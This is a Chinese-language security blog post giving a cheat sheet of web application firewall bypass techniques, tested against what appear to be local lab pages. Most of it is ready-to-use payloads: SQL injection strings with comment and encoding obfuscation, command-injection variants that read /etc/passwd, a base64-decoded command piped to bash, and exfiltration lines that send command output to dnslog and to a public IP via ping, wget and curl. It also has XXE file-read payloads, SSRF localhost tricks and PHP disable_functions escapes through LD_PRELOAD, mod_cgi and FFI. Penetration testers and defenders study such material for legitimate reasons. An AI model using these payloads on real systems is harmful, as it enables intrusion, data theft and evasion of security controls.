---
title: "WAF 绕过技术"
permalink: waf-bypass-techniques/
date: 2026-01-04 01:16:49
categories:
  - 网络安全
  - Web 安全
tags:
  - WAF
  - 绕过
  - Web安全
img: /medias/featureimages/12.jpg
summary: "语法层、协议层、业务层 WAF 绕过思路：编码混淆、分块传输、HTTP 参数污染与真实业务场景绕过。"
---

<!-- more -->

## WAF绕过  概述
什么是waf：web应用防火墙（应用层），专门拦截网站攻击流量

有哪些常见的waf：参考看图识别waf  [https://www.cnblogs.com/charon1937/p/13799467.html](https://www.cnblogs.com/charon1937/p/13799467.html)

#### 绕过waf
+ 没有通用的waf绕过方案
+ 多种方法综合使用
+ 绕过了waf不代表有漏洞，waf只是基于黑名单和语义分析进行的攻击行为拦截

## SQL注入
## 大小写绕过
mysql 语句大小写不敏感，在waf中使用正则表达式时，没有添加 i 修饰符

```plain
if (preg_match('/union|select|order|by|and|or/', $id)) {
            die("WAF: 检测到恶意关键字!");
        }
```

## 双写绕过
waf 把敏感字符替换成了 空

```plain
$id = str_ireplace("union", "", $id);
$id = str_ireplace("select", "", $id);
$id = str_ireplace("or", "", $id);
```

## 等价替换
### 空格  ✨
waf 拦截了空格

####  `%0a ，%0b ，%a0 ，%0c， %0d ，%09  `

#### 块注释替换空格
```plain
/**/
/*任意字符*/
```

### 运算符替换
```plain
or 等价 ||
and 等价 &&
= 等价 > 和 <
= 替换为 like
```

### 函数替换
当前的数据库名 -> 等价于 database() -> 等价于 hex编码后的字符串

盲注用到的函数也可以进行替换

substring -> substr -> left -> mid

### order by  ->union select
如果 order by 被拦截，直接使用 union select 测试即可，不需要order by

也可以用 into 语句代替 order by

 `1' into @1,@2,@3,@4%23  `

### 注释符  ✨
#### 行注释
```plain
#
--空格
```

#### 块注释
可以用于替换空格

```plain
/**/
/*任意字符*/
```

####  条件注释
```plain
/*!SQL语句*/
/*!50000SQL语句*/
/*!40000SQL语句*/
```

```plain
/*!order*/ 只有在mysql中才会执行order
/*!50000SQL语句*/ 只有在mysql>5版本中才会执行order
/*!40000SQL语句*/ 只有在mysql>4版本中才会执行order
```

块注释和条件注释综合使用

`http://192.168.79.120:8081/lab5_comment.php?id=1'%0a/**/%0b/*helloworld*//*!50000order*/%0a/*fhweibegrb*//**//*!40000by*/%0a9/**/--+`

## sqlmap tamper 脚本✨
**sql注入绕 waf 用 tamper 脚本**

  `https://pingmaoer.github.io/2019/06/24/sqlmap-tamper%E8%AF%A6%E8%A7%A3/`

`python /home/yu/sqlmap/sqlmap.py -u "http://192.168.79.120:8081/lab5_comment.php?id=1" --tamper space2comment,randomcase --flush-session -v 3`

写一个自己的tamper 脚本 （双写绕过举例）

找一个 改动

`python /home/yu/sqlmap/sqlmap.py -u "http://192.168.79.120:8081/lab2_double.php?id=1" --tamper shuangxie --flush-session -v 3`

## 命令执行
## 等价替换
以查看文件举例

`cat = more = head = tail = tac  `

## 命令拼接
使用shell脚本的变量定义和调用，分割和拼接命令

```plain
cat /etc/passwd
a=ca;b=t;c=/et;d=c/passwd;$a$b $c$d
```

## 通配符替换文件名
```plain
cat /etc/passwd
cat /et*/pass*
```

## 添加引号
 linux shell 中可以随便加成对单引号或双引号

`Submit=Submit&ip=www.baidu.com;c""a''t /""e''tc/p''ass""wd`

## 添加反斜杠
 linux shell 中可以随便加 \

`Submit=Submit&ip=www.baidu.com;c\a''t /e''\tc/pa\s""s\w""d`

## 添加空字符
 添加一些shell中值为空的变量

`Submit=Submit&ip=www.baidu.com;c${yjhhh}\a''t /e''\t${bhuub}c/p${ihgv}a\s""s\w""d$dfg  `

## 脚本参数
+ @
+ *

 都代表当前脚本的所有参数，默认为空

`c$*a$@t /e$*t$@c/pa$@ssw$@d`

## 空格替换✨
Linux shell 值为**空格的变量 ${IFS}**

`c$*at${IFS}/et$@c/pa$@sswd`

{} 包裹 (只有bash环境才能用)

` {cat,/etc/passwd}  `

系统变量定义hex空格 (只有bash环境才能用)

 `ABC=$'\x20/etc/passwd';cat$ABC  `

## base64编码 ✨
```plain
cat /etc/passwd
echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash
ec''ho${IFS}Y2F0IC9ldGMvcGFzc3dk|ba''se''64${IFS}-d|b''ash
```

## 反引号执行

`Submit=Submit&ip=www.baidu.com;echo `cat /etc/hosts``

`Submit=Submit&ip=www.baidu.com;echo `id``

## 数据外带✨
#### dnslog 外带
ping 或 nslookup

`ping -c 1 `whoami|base64`.f6f0mo.dnslog.cn`

[http://dnslog.cn/](http://dnslog.cn/)

#### http 外带
`wget "http://101.42.20.101:8000/?`id|base64`"`

`curl "http://101.42.20.101:8000/?`id|base64`"`

## 文件上传
1 修改JS、替换JS、burp抓包（上传 jpg 文件，修改文件名）

2 修改MIME 类型（如：后端拦截了 MIME，修改MIME为 image/png image/jpeg image/gif 即可绕过）

3 修改文件后缀名

4 先上传一个图片马，再上传一个`.htaccess`文件（.htaccess 是apache解析策略文件，规定了当前目录的文件怎么解析，目前是：当前目录的所有文件都当做php解析）

5 GET 型参数 00 截断路径

前提条件：

- php 小于 5.3

- php 配置 magic_quotes_gpc = Off

6 POST 型参数 00 截断路径

7 上传图片马 + 文件包含解析图片马 (制作的图片马依然是图片，需要借助中间件解析策略 （apache .htaccess） 或文件包含漏洞才能把 图片马 解析执行起来)

8 可以防御 多次压缩渲染的 图片马

9 条件竞争（竞争上传+竞争访问）

## SSRF
## @截断
`http://www.baidu.com@127.0.0.1`

等价

`http://127.0.0.1`

## ipv6 绕过
`http://[::ffff:127.0.0.1]`

等价

`http://127.0.0.1`

## 短链接 （302跳转）
访问 `https://reurl.cc/MML4jp` 就自动跳转到 `https://www.chaitin.cn/training  `

[https://reurl.cc/main/cn](https://reurl.cc/main/cn)

### 限制 ：
+ 国内基本关闭
+ 短链接大部分不支持局域网ip，需要是真实的公网网站才能转成短链接
+ 很多 ssrf 漏洞不支持自动跳转 （php 的 file_get_contents 函数无法跳转）

### 域名解析
`http://127.0.0.1`

可以替换为A记录为127.0.0.1的公共域名，比如 `wifi.aliyun.com` `ecd.tencent.com`  `localtest.me  ` 或自己搭建

## XXE
## html 实体编码
### 1  编码payload
```plain
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY a SYSTEM "file:///etc/passwd">

]>
<user><username>&a;</username><password>123</password></user>
```

### 2  去头（xml头和dtd头），去空格和换行
`<!ENTITY a SYSTEM "file:///etc/passwd">]><user><username>&a;</username><password>123</password></user>`

### 3  html 实体编码

### 4  封装新的 payload (参数实体的定义和调用)
```plain
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % dc "html实体编码后的内容"> %dc;
```

## UTF16 编码
`python utf8to16.py -i 待编码的文件 -o 编码后导出的文件  `

`utf16 不能直接复制粘贴，需要使用 burp 粘贴自文件功能  `

## php disable functions
## 怎么查看和判断命令执行被禁用
php禁用函数配置项

#### antsword 连接webshell后能看文件，但无法命令执行

####  phpinfo 可以看到 disable_functions 配置项

## 等价函数代替
`假设 disable_functions 配置了 system 函数，可以把 system 替换为 exec 、popen、shell_exec 、passthru  `

## LD_PRELOAD
bypass_disable_functions/1

### 操作
#### 1  antsword 插件下载，右键任意webshell，选择“插件市场”
#### 2  下载 "绕过 disable_functions" 插件

#### 3  对无法执行命令的webshell 右键选择使用 绕过disable_functions 插件

#### 4  选择 LD_PRELOAD 绕过方式

#### 5  LD_PRELOAD 会自动上传一个 so文件（动态链接库）和 .antporxy.php （新的webshell）

#### 6  链接新的webshell .antproxy.php （连接密码与原有webshell一致） 即可实现 disable_functions 绕过

### 原理
#### LD_PRELOAD 是什么：
LD_PRELOAD 是linux 环境变量，值是so文件路径，作用是在新的进程打开时，系统会优先自动 执行 LD_PRELOAD 中指定的so文件

#### 绕过disable_functions操作原理
+ 上传一个 恶意的 so 文件，把 LD_PRELOAD 配置为 恶意为 so 文件
+ php 的 mail 、 error_log 、 pcntl_exec 、 mb_send_mail 等函数能够打开新的进程，打 开新进程时，会自动加载执行 LD_PRELOAD 指定的 so 文件

`https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1`

```plain
// 1. 设置环境变量，指向你的 so 文件
putenv("LD_PRELOAD=/tmp/hack.so");
// 2. 触发一个能开启新进程的函数（如 mail）
mail("a@b.com", "", "", "");
```

## apache mod cgi
bypass_disable_functions/3

### 操作
`https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3`

### 原理
上传 .htaccess ，指定 .ant 后缀的文件为 cgi 脚本文件 （shell脚本）

```plain
Options +ExecCGI
AddHandler cgi-script .ant
```

编写shell脚本执行命令

```plain
#!/bin/bash
id
```

apache cgi 能自动执行shell脚本。从而绕过 php disable_functions 的限制

## PHP fpm
bypass_disable_functions/5

### 操作

连接新的 .antproxy.php 木马，即可绕过

### 原理
`https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5`

#### 使用 php -S
命令在目标机器上启动一个新的网站，新的网站不受原有php配置的影响，故能绕过 disable_functions

## FFI 拓展
bypass_disable_functions/8

### 操作

### 原理
`https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/8`

php FFI 拓展，可以在 php 中执行 c语言代码，c语言可以执行命令，不受php配置的影响

```php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("whoami > /tmp/123");
echo file_get_contents("/tmp/123");
@unlink("/tmp/123");
```

## php 漏洞 / 系统漏洞
`https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2`

+ bash 破壳漏洞 CVE-2014-6271 ，antsword 自带bash破壳漏洞 绕过，不需要插件
+  php 各种 UAF 漏洞

## 通用waf绕过
`https://wooyun.js.org/drops/深入了解SQL注入绕过waf和过滤机制.html`

## 参数污染
### 参数重叠
`http://192.168.79.120:8081/lab6_hpp.php?id=8639520&id=1' order by 4--+`

上述特殊情况，在 `apache、 nginx 、iis、 tomcat` 中都认为 `id=1' order by 9#` ，直接忽略` id=8639520` waf 因为对参数的检测策略不同，`可能只检测了 第一个 id`，发现第一个 `id=8639520`，是无危害的

### 中间件解析
+ waf 经常使用 nginx 、 c 、lua
+ 网站可能使用 iis 、asp、asp.net
+ nginx 和 iis 对同一个参数名或参数值的解析会出现差异

`比如参数中出现 ord%er b%y ， nginx 写的waf 得到 ord%er b%y ，无危害，waf放行，进入到 iis 网站时，iis会把 % 自动去掉，变成原本的 order by 产生SQL注入  `

## 脏数据 （缓冲区溢出)
### 大量参数（数量溢出）

**很多waf有参数检测上线，比如 nginx lua waf默认检测参数的上限是100个，从101个参数开始， 就不会经过waf**

**可以用脚本随机生成几百个参数键值对**

`id=1' order by 4--+ `是第 101 个参数，如果目标使用了 lua waf，则不会检测第101个参数

### 参数值溢出
POST 数据太多，超过waf的检测范围 (waf 一般只会检测参数值的前几千个字符)

## 分块传输 ,只适用POST请求
POST数据不限制大小，服务器怎么知道POST数据的具体大小？

+ 方法1：通过请求头 Content-length
+ 方法2：在Transfer-Encoding: Chuncked 启用分块传输的情况下，通过 \r\n 和长度标识区分 大小

burp插件：（自动把post请求体改为分块传输的格式）

[https://github.com/c0ny1/chunked-coding-converter](https://github.com/c0ny1/chunked-coding-converter)

正常的 Content-Length 的传输

使用插件自动修改, 分块传输的格式

#### 怎么分辨是分块传输
+ 请求头中有 `Transfer-Encoding: chunked`
+ 请求体符合分块传输的格式

```php
3（长度大小）;RRIUxpACA（注释，随意字符）
id=（具体数据）
2（长度大小）;RzlyLSbC（注释，随意字符）
1%（具体数据）
...........
0\r\n
\r\n (0加上两个回车换行代表请求体结束)

```

## waf 白名单
waf 为了增加速度，就会设置一些白名单的路径或白名单的文件，不检测直接放行，常见js、css

`假设waf认为 /static/ 静态资源目录中的所有文件都是白名单  `

## HTTP 头
waf 可能会封禁攻击者的ip地址，可以采取使用 http 头的方式伪造 ip 地址尝试绕过

 burp 插件  : [https://github.com/TheKingOfDuck/burpFakeIP](https://github.com/TheKingOfDuck/burpFakeIP)

### burp burpFakeIP 插件在 Repeater 中的使用

### 常见的代表 IP 的请求头  XFF
##### 作用都是标识了客户端的
##### ip地址  xff 头

#### burp burpFakeIP 插件在爆破中的使用
